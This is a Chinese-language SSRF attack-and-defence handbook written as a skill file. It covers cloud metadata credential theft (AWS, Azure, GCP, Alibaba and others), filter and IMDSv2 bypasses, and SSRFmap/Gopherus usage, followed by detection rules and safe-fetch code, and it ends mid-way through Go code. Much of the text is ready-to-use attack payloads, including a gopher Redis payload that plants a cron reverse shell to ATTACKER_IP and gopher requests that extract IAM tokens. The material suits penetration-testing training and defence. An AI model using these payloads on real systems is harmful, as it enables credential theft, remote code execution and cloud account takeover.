---
name: web-injection-ssrf
description: >
  全面覆盖 SSRF（服务端请求伪造）漏洞的识别、利用、检测和修复。涵盖所有 SSRF 变体
  （经典 SSRF、盲 SSRF、半盲 SSRF），覆盖所有协议（HTTP、HTTPS、file://、gopher://、
  dict://），包含云环境元数据窃取（AWS/Azure/GCP 169.254.169.254）、
  内网探测、协议走私、DNS 重绑定、WAF/过滤器绕过技术，
  以及防御侧的 URL 白名单、出站网络控制、响应验证。
domain: cybersecurity
subdomain: web-security
tags: [ssrf, server-side-request-forgery, blind-ssrf, cloud-metadata, gopher, dns-rebinding, aws-metadata, owasp-a10]
version: 2.0.0
---

# SSRF 服务端请求伪造 — 完整攻防手册

## 适用场景

- Web 应用中存在 URL 提交/预览/导入/fetch 功能
- 后端发起 HTTP 请求（图片加载、PDF 生成、Webhook、API 调用）
- 云环境（AWS/Azure/GCP）中需要评估元数据 API 暴露风险
- 代码审计中发现 `file_get_contents`、`requests.get`、`curl`、`HttpClient` 等接受用户输入

---

## Part A：攻击方法论

### 1. 漏洞识别

#### 1.1 常见 SSRF 触发点

| 功能 | 参数示例 | 请求方向 |
|------|---------|---------|
| URL 预览/加载 | `?url=http://example.com` | 服务端 → 用户指定 URL |
| 图片加载 | `?image=https://img.com/a.png` | 服务端 → 下载图片 |
| PDF 生成 | `?html_url=http://template.com` | 服务端 → 获取 HTML |
| Webhook | POST `{"callback":"http://hook.com"}` | 服务端 → 事件通知 |
| API 代理 | `/proxy?url=http://api.com/data` | 服务端 → 转发请求 |
| 导入功能 | `?import_url=http://feed.com/rss` | 服务端 → 获取数据 |
| 文件读取 | `?file=report.pdf` → 可能支持 `file://` | 服务端 → 本地文件 |

#### 1.2 盲 SSRF 识别

```
# 响应中无请求结果内容，但服务端确实发起了请求
# 检测方法：使用外部可控的 DNS/HTTP 日志服务

# Burp Collaborator
GET /fetch?url=http://XXXX.burpcollaborator.net HTTP/1.1

# interactsh (ProjectDiscovery)
GET /fetch?url=http://XXXX.interact.sh HTTP/1.1

# 自建服务器
GET /fetch?url=http://YOUR_VPS_IP:PORT/test HTTP/1.1
# 在 VPS 上: nc -lvnp PORT 观察连接
```

### 2. 内网探测与利用

#### 2.1 云元数据窃取（高价值目标）

```bash
# === AWS EC2 元数据 (IMDSv1 - 无需认证) ===
# 通过 SSRF 获取 IAM 凭据
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# 返回: AccessKeyId, SecretAccessKey, Token → 可直接接管 AWS 账户

http://169.254.169.254/latest/user-data/        # 启动脚本（可能含密钥）
http://169.254.169.254/latest/dynamic/instance-identity/document  # 实例信息

# IMDSv2 (需要 PUT 请求先获取 Token) — 仅部分 SSRF 可利用
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600
# → 获取 token，然后:
GET http://169.254.169.254/latest/meta-data/
X-aws-ec2-metadata-token: TOKEN_VALUE

# === Azure 元数据 ===
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# 必须带 Header: Metadata: true

http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# → 获取 Azure AD Token

# === GCP 元数据 ===
http://metadata.google.internal/computeMetadata/v1/
# 必须带 Header: Metadata-Flavor: Google

http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# → 获取 GCP Access Token

http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
# → SSH 公钥

# === DigitalOcean ===
http://169.254.169.254/metadata/v1.json

# === Alibaba Cloud ===
http://100.100.100.200/latest/meta-data/
```

#### 2.2 内网服务探测

```
# 常见内网目标
http://127.0.0.1:22/          # SSH
http://127.0.0.1:3306/         # MySQL
http://127.0.0.1:6379/         # Redis
http://127.0.0.1:9200/         # Elasticsearch
http://127.0.0.1:5601/         # Kibana
http://127.0.0.1:7001/         # WebLogic
http://127.0.0.1:8080/         # Tomcat/Proxy
http://127.0.0.1:8500/         # Consul
http://127.0.0.1:2375/         # Docker API
http://127.0.0.1:4443/         # Selenium

# Redis 利用（通过 gopher 协议）
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$56%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

### 3. 协议利用

```
# === file:// 协议 ===
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ        # 环境变量（可能含密钥）
file:///proc/self/cmdline        # 进程命令行
file:///proc/self/fd/X           # 文件描述符（可能泄露其他请求）

# === gopher:// 协议 ===
# 构造任意 TCP 数据包
gopher://TARGET:PORT/_PAYLOAD

# MySQL 未授权利用
gopher://127.0.0.1:3306/_HELO_PAYLOAD

# FastCGI 利用
gopher://127.0.0.1:9000/_FCGI_PAYLOAD

# === dict:// 协议 ===
dict://127.0.0.1:6379/INFO      # Redis INFO 命令
dict://127.0.0.1:6379/KEYS:*    # Redis KEYS 命令
```

### 4. 过滤器绕过

#### 4.1 IP 地址绕过

```
# 十进制/八进制/十六进制 IP
127.0.0.1     → 2130706433     (十进制)
127.0.0.1     → 0x7f000001     (十六进制)
127.0.0.1     → 017700000001   (八进制)
127.0.0.1     → 0177.0.0.1     (八进制混合)
127.0.0.1     → 0x7f.0.0.1     (十六进制混合)
127.0.0.1     → 0177.0.0.1     (部分八进制)

# IPv6 地址
[::1]           → 127.0.0.1 (IPv6 loopback)
[::ffff:127.0.0.1]
[0:0:0:0:0:ffff:127.0.0.1]

# 特殊域名解析到 127.0.0.1
# https://ssrf.localtest.me → 127.0.0.1
# https://spoofed.burpcollaborator.net → 127.0.0.1 (DNS Rebinding)

# URL 解析差异
http://127.1                    # 短格式
http://0177.0.0.1               # 八进制
http://0x7f000001               # 十六进制
http://127.0.0.1.nip.io         #nip.io 通配符 DNS

# 重定向绕过（服务端跟随重定向）
# 过滤了内网 IP，但服务端跟随 302 → 内网
?url=http://ATTACKER.com/redirect  → 302 → http://169.254.169.254/latest/meta-data/
```

#### 4.2 URL 解析绕过

```
# URL 解析器差异
http://evil.com#@safe.com        # 某些解析器认为主机是 safe.com
http://evil.com\@safe.com        # 反斜杠混淆
http://evil.com%00@safe.com      # 空字节
http://evil.com:80%23@safe.com   # URL 编码 # 号
http://safe.com?return=http://evil.com  # 参数注入

# DNS Rebinding
# 第 1 次解析: evil.com → 公网 IP (通过过滤)
# 第 2 次解析: evil.com → 127.0.0.1 (实际请求)
# 实现: DNS TTL=0, 交替返回两个 IP
# 工具: https://github.com/nccgroup/singularity
```

#### 4.3 云元数据绕过

```
# IMDSv1 基础
http://169.254.169.254/latest/meta-data/

# IP 绕过
http://[0:0:0:0:0:ffff:a9fe:a9fe]/     # IPv6 映射
http://0xa9fea9fe/                       # 十六进制
http://2852039166/                       # 十进制

# 通过 DNS 重绑定
http://169.254.169.254.nip.io/           # 解析到 169.254.169.254
http://metadata.google.internal/         # GCP 用域名不用 IP

# 通过 URL 编码
http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/

# 通过 302 重定向
?url=http://attacker.com/meta-redirect
# 返回: 302 Location: http://169.254.169.254/latest/meta-data/

# === gopher 构造 PUT 绕过 IMDSv2（2025 新技术，MIDA2025-0005）===
# 原理：IMDSv2 要求先 PUT /latest/api/token 拿 Token，再带 Token GET 元数据。
# 传统 SSRF 只能发 GET，故被 IMDSv2 挡住；但若 SSRF 支持 gopher:// 协议，
# 可把「完整 HTTP 请求（含 PUT + 自定义 Header）」编码进 gopher URL，绕过"只发 GET"限制。
# 完整链路分两步：

# 步骤 1：gopher 构造 PUT 请求获取 IMDSv2 Token
gopher://169.254.169.254:80/_PUT%20/latest/api/token%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0aX-aws-ec2-metadata-token-ttl-seconds:%2021600%0d%0aContent-Length:%200%0d%0a%0d%0a

# 步骤 2：拿到 Token 后，gopher 构造带 Token 的 GET 读元数据（IAM 凭据）
gopher://169.254.169.254:80/_GET%20/latest/meta-data/iam/security-credentials/<role>%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0aX-aws-ec2-metadata-token:%20<TOKEN>%0d%0a%0d%0a

# 关键点（判据）：
# 1. 仅当 SSRF 支持 gopher://（且后端库/代理未禁用非 HTTP 协议）才可行
# 2. PUT 请求体为空（Content-Length: 0），Token 由 TTL 头指定有效期
# 3. Token 拿到后必须在同一 Host/角色上下文里用，且 Hop Limit 需允许从当前跳板转发
# 来源：mcaiden.com/2025/04/25/circumvent-imdsv2-using-gopher-protocol/（MIDA2025-0005）
```

### 5. 盲 SSRF 利用升级

```
# 1. 错误信息泄露 — 观察错误响应中的 IP/端口信息
?url=http://127.0.0.1:22/   → "Connection refused" = 端口关闭但主机存活
?url=http://127.0.0.1:80/   → "200 OK" 或 "timeout" = 端口开放

# 2. 时间差异 — 端口扫描
?url=http://127.0.0.1:PORT/
# 开放端口: 快速响应
# 关闭端口: Connection refused (快)
# 过滤端口: timeout (慢)

# 3. HTTP Pipeline / 请求走私
# 利用 SSRF 向内部服务注入恶意请求

# 4. 盲 SSRF → XSS
# 如果内部服务将 URL 内容渲染到页面
?url=http://internal-app/dashboard?name=<script>alert(1)</script>
```

---

## Part B：检测与防御

### 6. 检测规则

```yaml
# Sigma 规则 — SSRF 指标
title: Server-Side Request Forgery Indicators
status: experimental
logsource:
  category: webserver
detection:
  selection:
    cs-uri-query|contains:
      - "169.254.169.254"
      - "metadata.google.internal"
      - "127.0.0.1"
      - "localhost"
      - "[::1]"
      - "0x7f000001"
      - "2130706433"
      - "file:///"
      - "gopher://"
      - "dict://"
  condition: selection
level: high
tags:
  - attack.t1190
  - attack.initial_access
```

### 7. 修复方案

#### 7.1 URL 白名单（首选）

```python
# Python — 安全 URL 获取
import ipaddress
import socket
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['api.github.com', 'api.stripe.com']

def safe_fetch(url):
    parsed = urlparse(url)

    # 1. 协议白名单
    if parsed.scheme not in ('https',):
        raise ValueError("Only HTTPS allowed")

    # 2. 域名白名单
    if parsed.hostname not in ALLOWED_DOMAINS:
        raise ValueError(f"Domain not allowed: {parsed.hostname}")

    # 3. DNS 解析后验证 IP（防 DNS Rebinding）
    resolved_ip = socket.gethostbyname(parsed.hostname)
    ip = ipaddress.ip_address(resolved_ip)

    if ip.is_private or ip.is_loopback or ip.is_reserved:
        raise ValueError(f"Private IP not allowed: {resolved_ip}")

    # 4. 发起请求（使用解析后的 IP，设置 Host 头）
    # 确保实际连接到验证后的 IP
    ...
```

```java
// Java — 安全 HTTP 客户端
public class SafeUrlValidator {
    private static final Set<String> ALLOWED_HOSTS = Set.of("api.example.com");

    public static URL validateUrl(String urlString) throws Exception {
        URL url = new URL(urlString);

        if (!"https".equals(url.getProtocol()))
            throw new SecurityException("Only HTTPS allowed");

        if (!ALLOWED_HOSTS.contains(url.getHost()))
            throw new SecurityException("Host not allowed");

        // 解析 DNS 并验证 IP
        InetAddress addr = InetAddress.getByName(url.getHost());
        if (addr.isLoopbackAddress() || addr.isSiteLocalAddress() || addr.isLinkLocalAddress())
            throw new SecurityException("Private IP not allowed");

        return url;
    }
}
```

#### 7.2 网络层防护

```
# 出站网络限制 — 阻止服务端访问内网/元数据

# AWS — 安全组出站规则
# 移除 0.0.0.0/0 出站，仅允许必要目标
# 阻止 169.254.169.254 访问（除非需要）

# IAM 策略 — 限制 IMDS
# 使用 IMDSv2（需 PUT 获取 Token）
aws ec2 modify-instance-metadata-options --instance-id i-xxx \
  --http-tokens required --http-endpoint enabled

# Kubernetes — NetworkPolicy
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-metadata
spec:
  podSelector: {}
  policyTypes: ["Egress"]
  egress:
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
          - 169.254.169.254/32
          - 10.0.0.0/8
          - 172.16.0.0/12
          - 192.168.0.0/16
          - 127.0.0.0/8
```

#### 7.3 纵深防御

| 层级 | 措施 |
|------|------|
| 输入验证 | URL 白名单 + 协议白名单 |
| DNS 解析验证 | 解析后检查 IP 是否为私有地址 |
| 响应验证 | 检查 Content-Type，禁止返回原始响应内容 |
| 网络隔离 | 安全组/防火墙限制出站流量 |
| 禁用危险协议 | `file://`、`gopher://`、`dict://` |
| 禁用重定向 | `curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false)` |
| IMDSv2 | 强制 Token 认证访问元数据 |

---

## 速查表

### SSRF 利用决策树

```
URL 参数可控？
├── 是 → 可以指定任意 URL
│   ├── 有响应内容？
│   │   ├── 是 → 经典 SSRF
│   │   │   ├── file:// 可用？→ 读取本地文件
│   │   │   ├── gopher:// 可用？→ 任意 TCP 攻击（Redis/MySQL/FastCGI）
│   │   │   ├── 云环境？→ 169.254.169.254 元数据窃取
│   │   │   └── 内网可达？→ 端口扫描 + 内网服务攻击
│   │   └── 否 → 盲 SSRF
│   │       ├── DNS/HTTP 外带 → 确认漏洞
│   │       ├── 时间差异 → 端口扫描
│   │       └── 错误信息 → 探测服务
│   └── 有 IP 过滤？
│       ├── 十进制/八进制/十六进制编码绕过
│       ├── IPv6 地址绕过
│       ├── DNS 重绑定
│       ├── 302 重定向绕过
│       └── URL 解析差异绕过
└── 否 → 可能不是 SSRF
```

## MITRE ATT&CK 映射

| Tactic | Technique | ID |
|--------|-----------|-----|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Discovery | Remote System Discovery | T1018 |
| Credential Access | Unsecured Credentials: Cloud Instance Metadata API | T1552.005 |
| Lateral Movement | Internal Proxying | T1090 |

## 前置条件

- 目标 Web 应用可访问
- Burp Suite / Collaborator 或外部可控服务器可用
- 了解目标是否部署在云环境
- 对于云利用：了解目标云服务商的元数据 API 格式

---

## Part C：2025-2026 更新

> 以下内容基于 2025-2026 年最新 SSRF 攻防研究、CVE 披露和云安全演进进行补充。

### 8. 云环境 SSRF 深度利用

#### 8.1 AWS IMDSv2 绕过与利用

```
# === IMDSv2 防护原理 ===
# IMDSv2 要求先 PUT 获取 Token，再 GET 携带 Token 访问元数据
# 默认 PUT 的 Hop Limit = 1，防止从容器/跳板机转发

# 强制启用 IMDSv2（防御侧）
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxx \
  --http-tokens required \
  --http-endpoint enabled \
  --http-put-response-hop-limit 1

# === IMDSv2 绕过场景 ===
# 场景 1: SSRF 支持 PUT 方法 + 自定义 Header
PUT /proxy?url=http://169.254.169.254/latest/api/token HTTP/1.1
X-aws-ec2-metadata-token-ttl-seconds: 21600
# → 获取 Token，然后:
GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
X-aws-ec2-metadata-token: AQAEAAAA...TOKEN...

# 场景 2: Hop Limit 配置不当（设为 2+）
# 检查当前配置:
aws ec2 describe-instances --instance-ids i-xxx \
  --query "Reservations[0].Instances[0].MetadataOptions"

# 场景 3: 通过 gopher 协议构造 PUT 请求
# 某些 SSRF 场景下可通过 gopher 发送完整 HTTP 请求
gopher://169.254.169.254:80/_PUT%20/latest/api/token%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0aX-aws-ec2-metadata-token-ttl-seconds:%2021600%0d%0aContent-Length:%200%0d%0a%0d%0a
```

#### 8.2 GCP 元数据深度利用

```bash
# === GCP 元数据全路径 ===
# 注意: 必须带 Header "Metadata-Flavor: Google"

# 获取 Access Token
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# 获取 Service Account 邮箱
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email

# 获取项目 SSH 密钥
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys

# 获取启动脚本（可能含密钥）
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script

# === GCP SSRF 绕过 Header 检查 ===
# 某些 SSRF 场景可注入自定义 Header:
?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# 注入 Header: Metadata-Flavor: Google

# 通过 302 重定向注入 Header（某些客户端会保留自定义 Header）
# 通过 gopher 构造完整请求:
gopher://metadata.google.internal:80/_GET%20/computeMetadata/v1/instance/service-accounts/default/token%20HTTP/1.1%0d%0aHost:%20metadata.google.internal%0d%0aMetadata-Flavor:%20Google%0d%0a%0d%0a

# === 2025: GCP Apigee SSRF (SetIntegrationRequest) ===
# IntegrationRegion 参数 SSRF → 服务账号令牌泄露
# 参考: https://docs.cloud.google.com/support/bulletins
```

#### 8.3 Azure Instance Metadata 深度利用

```bash
# === Azure IMDS 完整利用 ===

# 基础实例信息
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# 获取 Managed Identity Token
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# → 返回 access_token，可直接操作 Azure Resource Manager

# 获取网络信息
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0?api-version=2021-02-01"

# 获取负载均衡器信息
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/loadbalancer?api-version=2021-02-01"

# === Azure SSRF 绕过 ===
# 通过 IPv6 映射:
http://[fd00:ec2::254]/metadata/instance?api-version=2021-02-01
# 通过十进制:
http://2852039166/metadata/instance?api-version=2021-02-01
```

#### 8.4 其他云平台元数据

```bash
# === Oracle Cloud (OCI) ===
# 2025: Oracle SSRF 元数据攻击成为热门目标 (CVE-2025-61882)
http://169.254.169.254/opc/v1/instance/
http://169.254.169.254/opc/v1/instance/metadata/
# → 可能泄露 Oracle Cloud 凭证和实例配置

# === Alibaba Cloud (阿里云) ===
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
# → RAM 角色临时凭证

# === Tencent Cloud (腾讯云) ===
http://metadata.tencentyun.com/latest/meta-data/
http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/
http://metadata.tencentyun.com/meta-data/instance-id
http://metadata.tencentyun.com/meta-data/placement/region
# → CAM 角色临时凭证（TmpSecretId/TmpSecretKey/Token）

# === Huawei Cloud (华为云) ===
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/openstack/latest/securitykey
# → 实例密钥（AK/SK）

# === Volcano Engine (火山引擎) ===
http://100.96.0.96/latest/meta-data/
http://100.96.0.96/latest/meta-data/security-credentials/
# → 角色临时凭证（AccessKeyId/SecretAccessKey/Token）

# === Kubernetes Service Account Token ===
# 非 cloud-native 但常在云环境中一起利用
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

#### 8.5 云元数据 SSRF 快速对照矩阵

| 云平台 | 元数据端点 | 认证方式 | SSRF 利用难度 | 关键收益 |
|--------|-----------|---------|-------------|---------|
| AWS | `169.254.169.254` | IMDSv2 PUT Token | 中-高 (需 PUT，可 gopher 绕过) | IAM 临时凭证 |
| GCP | `metadata.google.internal` | Header: Metadata-Flavor | 中 (需自定义 Header) | Access Token / SSH |
| Azure | `169.254.169.254` | Header: Metadata: true | 中 (需自定义 Header) | Managed Identity Token |
| Oracle | `169.254.169.254` | 无 (OCI) | 低 | 实例配置/凭证 |
| Alibaba | `100.100.100.200` | 无 | 低 | RAM 临时凭证 |
| Tencent | `metadata.tencentyun.com` | 无 | 低 | CAM 临时凭证 (TmpSecretId/Key/Token) |
| Huawei | `169.254.169.254` | 无 | 低 | AK/SK 实例密钥 |
| Volcano | `100.96.0.96` | 无 | 低 | 角色临时凭证 (AK/SK/Token) |
| DigitalOcean | `169.254.169.254` | 无 | 低 | Droplet 信息 |
| Kubernetes | 文件系统路径 | 文件读取 | 低 (需 file://) | Service Account Token |

---

### 9. DNS Rebinding 绕过（进阶）

```
# === DNS Rebinding 攻击原理 ===
# 1. 应用对 URL 做域名解析 → 获取 IP → 检查是否为内网地址
# 2. 检查通过后 → 再次解析域名 → 实际发起请求
# 3. 利用 DNS TTL=0, 两次解析返回不同 IP

# 攻击流程:
# 第一次解析: rebinding.attacker.com → 8.8.8.8 (公网 IP, 通过过滤)
# 第二次解析: rebinding.attacker.com → 127.0.0.1 (内网 IP, 实际请求)

# === 工具: Singularity (NCC Group) ===
# https://github.com/nccgroup/singularity
# 自动化 DNS Rebinding 攻击框架

# 配置示例:
# 1. 启动 Singularity DNS 服务器
# 2. 配置域名: a.rebind.attacker.com
#    - 第一次解析: 返回 1.2.3.4
#    - 第二次解析: 返回 127.0.0.1
# 3. SSRF payload:
?url=http://a.rebind.attacker.com/latest/meta-data/

# === 防御: 在 DNS 解析后使用解析的 IP 直连 ===
# 关键: 解析一次 → 使用 IP 直连 → 不再重新解析
# Python 示例:
import socket
import requests

def safe_request(url):
    parsed = urlparse(url)
    ip = socket.gethostbyname(parsed.hostname)  # 解析一次
    # 验证 IP
    if is_private(ip):
        raise ValueError("Private IP blocked")
    # 使用 IP 直连，设置 Host 头
    return requests.get(f"http://{ip}{parsed.path}",
                        headers={"Host": parsed.hostname})
```

---

### 10. HTTP/HTTPS 协议走私绕过

```
# === HTTP/2 降级走私 (2025 热门攻击面) ===
# CVE-2025-55315 (ASP.NET Core Chunk Extensions Smuggling)
# HTTP/2 → HTTP/1.1 降级时, DATA 帧长度保护丢失

# 攻击场景:
# 1. 前端代理 (HTTP/2) → 后端服务器 (HTTP/1.1)
# 2. 利用 HTTP/2 的特性构造在 HTTP/1.1 中被不同解析的请求
# 3. 通过走私的请求访问内部服务 (SSRF 变体)

# === SSRF + 请求走私组合 ===
# 利用 SSRF 端点作为请求走私的跳板:
# 前端: GET /proxy?url=http://internal:8080/ HTTP/1.1
# 通过走私注入:
GET /proxy?url=http://internal:8080/ HTTP/1.1
Transfer-Encoding: chunked
Content-Length: 0

0

GET /admin/delete-user HTTP/1.1
Host: internal:8080
Authorization: Bearer stolen-token

# === WebSocket SSRF (2025 新攻击面) ===
# WebSocket 连接建立时的 HTTP Upgrade 请求可能被用于 SSRF
ws://internal-service:8080/socket
# 如果服务端将 WebSocket URL 作为后端连接目标

# ===防御: ===
# 1. 前后端使用相同的 HTTP 版本
# 2. 严格验证 Content-Length / Transfer-Encoding
# 3. 禁用 HTTP/2 降级或使用明确的边界配置
# 4. 使用反向代理 (Envoy/Nginx) 的防走私配置
```

---

### 11. IPv6/IPv4 混合绕过

```
# === IPv4-Mapped IPv6 地址绕过 (CVE-2026-26324 类型) ===
# 过滤器只检查 IPv4 格式，但 URL 解析器接受 IPv6

# 目标: 127.0.0.1
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:7f00:0001]/
http://[::ffff:7f00:1]/
http://[0000:0000:0000:0000:0000:ffff:127.0.0.1]/

# 目标: 169.254.169.254 (AWS/Azure 元数据)
http://[::ffff:169.254.169.254]/
http://[::ffff:a9fe:a9fe]/
http://[0:0:0:0:0:ffff:a9fe:a9fe]/

# === IPv6 Link-Local 地址 ===
http://[fe80::1]/
http://[fe80::1%25eth0]/     # 带网络接口标识
http://[fe80::c0a8:101]/    # 映射到 192.168.1.1

# === IPv6 缩写形式绕过 ===
http://[::1]/                 # loopback
http://[0:0::1]/             # loopback 变体
http://[0:0:0:0:0:0:0:1]/   # loopback 完整形式
http://[::]/                 # 0.0.0.0 等价

# === 归一化不匹配绕过 (2025 热门) ===
# LibreChat SSRF (GHSA-w5r7-4f94-vp4c) 类型漏洞
# 验证层: ::ffff:127.0.0.1 → 识别为 IPv4 → 检查通过
# URL 解析器: ::ffff:127.0.0.1 → 解析为 IPv6 → 连接到 127.0.0.1

# 防御: 统一使用 netip.ParseIP 进行归一化后检查
```

---

### 12. SSRFmap / Gopherus 工具使用

#### 12.1 SSRFmap — 自动化 SSRF 利用框架

```bash
# === 安装 ===
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap && pip3 install -r requirements.txt

# === 基本用法 ===
# -r: 包含目标 URL 的请求文件 (Burp 导出)
# -p: SSRF 参数名
# -m: 利用模块

# 模块列表:
# readfiles    - 读取本地文件
# portscan     - 端口扫描
# aws          - AWS 元数据窃取
# gce          - GCP 元数据窃取
# azure        - Azure 元数据窃取
# redis        - Redis 利用
# mysql        - MySQL 利用
# fastcgi      - FastCGI 利用

# === AWS 元数据窃取 ===
python3 ssrfmap.py -r request.txt -p url -m aws

# === 端口扫描 ===
python3 ssrfmap.py -r request.txt -p url -m portscan -l 1-1000

# === 读取文件 ===
python3 ssrfmap.py -r request.txt -p url -m readfiles -i "/etc/passwd"

# === 自定义目标 ===
python3 ssrfmap.py -r request.txt -p url -m portscan \
  --uagent "Mozilla/5.0" \
  --lhost "127.0.0.1" --lport 80
```

#### 12.2 Gopherus — Gopher 协议 Payload 生成器

```bash
# === 安装 ===
git clone https://github.com/tarunkant/Gopherus
cd Gopherus

# === 支持的服务 ===
# 1. MySQL     2. PostgreSQL    3. FastCGI
# 4. Redis     5. SMTP          6. Zabbix
# 7. Memcache  8. RabitMQ

# === Redis 利用 (写 Webshell) ===
./gopherus.py --exploit redis
# 输入目标 IP:port → 输入 Webshell 路径
# 生成 gopher:// payload

# === MySQL 利用 ===
./gopherus.py --exploit mysql
# 输入目标 IP:port → 输入 SQL 语句
# 生成 gopher:// payload

# === FastCGI 利用 (PHP 代码执行) ===
./gopherus.py --exploit fastcgi
# 输入目标 IP:port → 输入 PHP 代码
# 生成 gopher:// payload

# === 使用生成的 Payload ===
# 将 Gopherus 输出的 payload URL 编码后注入 SSRF 参数:
?url=gopher://127.0.0.1:6379/_*3%0d%0a...
# 或使用 SSRFmap 的 custom 模块:
python3 ssrfmap.py -r request.txt -p url -m custom
```

---

### 13. Kotlin / Spring / Go 安全修复代码

#### 13.1 Kotlin + Spring Boot 安全 URL 校验

```kotlin
import org.springframework.web.util.UriComponentsBuilder
import java.net.InetAddress
import java.net.URI
import java.net.UnknownHostException

class SsrfProtection {

    companion object {
        // 白名单域名
        private val ALLOWED_DOMAINS = setOf(
            "api.example.com",
            "cdn.example.com"
        )

        // 禁止的 IP 范围
        private fun isBlockedIp(ip: String): Boolean {
            val addr = InetAddress.getByName(ip)
            return addr.isLoopbackAddress ||
                   addr.isSiteLocalAddress ||
                   addr.isLinkLocalAddress ||
                   addr.isAnyLocalAddress ||
                   // 检查 IPv6 link-local
                   addr.hostAddress.startsWith("fe80:") ||
                   // 检查云元数据地址
                   ip == "169.254.169.254" ||
                   ip == "100.100.100.200"
        }
    }

    /**
     * 安全 URL 验证 — 防止 SSRF
     * 返回验证通过的安全 URL，或抛出异常
     */
    fun validateUrl(urlString: String): URI {
        // 1. 协议白名单
        val uri = URI(urlString)
        if (uri.scheme !in listOf("https")) {
            throw SecurityException("Only HTTPS protocol is allowed, got: ${uri.scheme}")
        }

        // 2. 域名白名单
        val hostname = uri.host
            ?: throw SecurityException("URL must have a valid hostname")

        if (hostname !in ALLOWED_DOMAINS) {
            throw SecurityException("Domain not in allowlist: $hostname")
        }

        // 3. DNS 解析后验证 IP (防 DNS Rebinding)
        val resolvedIps = InetAddress.getAllByName(hostname)
        for (ip in resolvedIps) {
            if (isBlockedIp(ip.hostAddress)) {
                throw SecurityException(
                    "Resolved to blocked IP: ${ip.hostAddress}"
                )
            }
        }

        // 4. 返回规范化 URL
        return UriComponentsBuilder.fromUri(uri)
            .build()
            .toUri()
    }
}
```

#### 13.2 Spring Boot 全局 SSRF 过滤器

```java
import org.springframework.web.filter.OncePerRequestFilter;
import javax.servlet.*;
import javax.servlet.http.*;
import java.net.InetAddress;
import java.util.Set;

/**
 * Spring Boot SSRF 防护过滤器
 * 拦截所有包含 URL 参数的请求，验证目标地址
 */
public class SsrfFilter extends OncePerRequestFilter {

    private static final Set<String> URL_PARAMS = Set.of(
        "url", "callback", "redirect", "next", "return_url",
        "image", "fetch", "import_url", "proxy"
    );

    @Override
    protected void doFilterInternal(
        HttpServletRequest request,
        HttpServletResponse response,
        FilterChain filterChain
    ) throws ServletException, java.io.IOException {

        for (String param : URL_PARAMS) {
            String value = request.getParameter(param);
            if (value != null && !value.isEmpty()) {
                try {
                    java.net.URL url = new java.net.URL(value);
                    InetAddress addr = InetAddress.getByName(url.getHost());

                    if (addr.isLoopbackAddress() ||
                        addr.isSiteLocalAddress() ||
                        addr.isLinkLocalAddress()) {
                        response.sendError(403, "SSRF attempt blocked");
                        return;
                    }
                } catch (Exception e) {
                    response.sendError(400, "Invalid URL parameter");
                    return;
                }
            }
        }
        filterChain.doFilter(request, response);
    }
}
```

#### 13.3 Go 安全 HTTP 客户端

```go
package ssrf

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// SafeHTTPClient 防止 SSRF 的安全 HTTP 客户端
type SafeHTTPClient struct {
	allowedDomains map[string]bool
	client         *http.Client
}

func NewSafeHTTPClient(allowedDomains []string) *SafeHTTPClient {
	domainMap := make(map[string]bool)
	for _, d := range allowedDomains {
		domainMap[d] = true
	}

	// 关键: 使用自定义 Dialer，在连接层面验证 IP
	dialer := &net.Dialer{Timeout: 10 * time.Second}
